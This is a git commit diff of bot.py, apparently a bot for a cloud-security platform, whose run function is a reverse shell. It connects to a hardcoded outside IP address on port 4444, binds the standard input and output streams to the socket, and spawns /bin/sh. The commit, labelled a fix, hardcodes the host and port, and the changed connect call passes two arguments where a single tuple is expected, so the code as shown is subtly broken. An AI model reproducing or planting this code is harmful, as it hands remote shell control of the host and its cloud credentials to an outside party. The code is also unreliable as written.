0fc6c9e5b9adea5071692b8c95d334cc4c971908
gizzardlizzard <141071142+gizzardlizzard@users.noreply.github.com>
2024-01-24 19:52:48 -0500

    fix call to s.connect

--- bot.py
+++ bot.py
@@ -3,9 +3,9 @@ import sonrai.platform.aws.arn
 import socket,os,pty
 
 def run(ctx):
-    RHOST="3.145.201.117"
-    RPORT=4444
+    rhost="3.145.201.117"
+    rport=4444
     s=socket.socket()
-    s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
+    s.connect(rhost,rport)
     [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
     pty.spawn("/bin/sh")
